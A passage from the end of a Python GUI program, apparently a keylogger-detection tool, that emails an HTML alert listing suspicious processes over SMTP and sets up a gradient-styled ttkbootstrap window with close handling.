        subject = f"ALERT: Suspicious Process Detected on {os.environ.get('COMPUTERNAME', 'Unknown PC')}"
        body_html = f"<h3>Suspicious Process Alert</h3><p>The following {len(processes)} suspicious process(es) were detected at {time.strftime('%Y-%m-%d %H:%M:%S')}:</p><table border='1' cellpadding='5' cellspacing='0'><tr><th>PID</th><th>Name</th><th>Command</th></tr>"
        for p in processes: 
            body_html += f"<tr><td>{p.get('pid')}</td><td>{p.get('name')}</td><td>{' '.join(p.get('cmdline', []))}</td></tr>"
        body_html += "</table>"
        
        msg = MIMEMultipart()
        msg['From'] = self.config['smtp_user']
        msg['To'] = self.config['recipient_email']
        msg['Subject'] = subject
        msg.attach(MIMEText(body_html, 'html'))
        
        try:
            with smtplib.SMTP(self.config['smtp_server'], self.config['smtp_port']) as server:
                server.starttls()
                # Clean password - remove spaces from Gmail App Password
                clean_password = self.config['smtp_password'].replace(' ', '')
                server.login(self.config['smtp_user'], clean_password)
                server.send_message(msg)
                print(f"Alert email sent to {self.config['recipient_email']}")
        except Exception as e:
            print(f"Failed to send email: {e}")
            self.root.after(0, lambda: self.status_label.config(text=f"Status: Email failed - {e}", foreground="orange"))


if __name__ == "__main__":
    root = tb.Window(themename="flatly")
    root.geometry("1000x700")
    # Gradient background using Canvas
    gradient_canvas = tb.Canvas(root, width=1000, height=700, highlightthickness=0, bd=0)
    gradient_canvas.pack(fill="both", expand=True)
    def draw_gradient(canvas, color1, color2):
        steps = 256
        r1, g1, b1 = int(color1[1:3],16), int(color1[3:5],16), int(color1[5:7],16)
        r2, g2, b2 = int(color2[1:3],16), int(color2[3:5],16), int(color2[5:7],16)
        for i in range(steps):
            r = int(r1 + (r2 - r1) * i / steps)
            g = int(g1 + (g2 - g1) * i / steps)
            b = int(b1 + (b2 - b1) * i / steps)
            color = f'#{r:02x}{g:02x}{b:02x}'
            canvas.create_rectangle(0, i*3, 1000, (i+1)*3, outline=color, fill=color)
    draw_gradient(gradient_canvas, '#fdfcfb', '#e2d1c3')
    # Create a frame above the canvas for widgets
    main_frame = tb.Frame(root)
    main_frame.place(relx=0, rely=0, relwidth=1, relheight=1)
    # Pass main_frame and root to KeyloggerAnalyzerApp
    app = KeyloggerAnalyzerApp(main_frame, root)
    def on_close():
        if hasattr(app, 'listener') and app.listener:
            app.listener.stop()
        root.destroy()
    root.protocol("WM_DELETE_WINDOW", on_close)
    close_btn = tb.Button(main_frame, text="Close App", command=on_close, bootstyle="success-outline")
    close_btn.pack(side="bottom", pady=16)
    root.mainloop()

    